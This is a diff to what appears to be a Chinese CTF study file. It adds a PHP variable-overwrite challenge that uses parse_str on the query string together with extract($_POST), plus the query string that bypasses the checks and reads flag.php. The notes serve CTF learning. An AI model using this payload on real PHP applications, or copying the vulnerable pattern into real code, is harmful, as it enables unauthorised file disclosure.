@@ -145,6 +145,28 @@ POST: v1=flag=cfcd208495d565ef66e7dff9f98764da
 
 
 
+^
+和extract()配合题：
+```
+$key1 = 0;
+$key2 = 0;
+if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
+    die("nonononono");
+}
+@parse_str($_SERVER['QUERY_STRING']);
+extract($_POST);
+if($key1 == '36d' && $key2 == '36d') {
+    die(file_get_contents('flag.php'));
+}
+```
+```
+?_POST[key1]=36d&_POST[key2]=36d
+通过parse_str转成$_POST[key1]=36d
+通过extract转成$key1=36d
+```
+
+
+^
 
 ^
 ## **%00截断和ereg()函数**
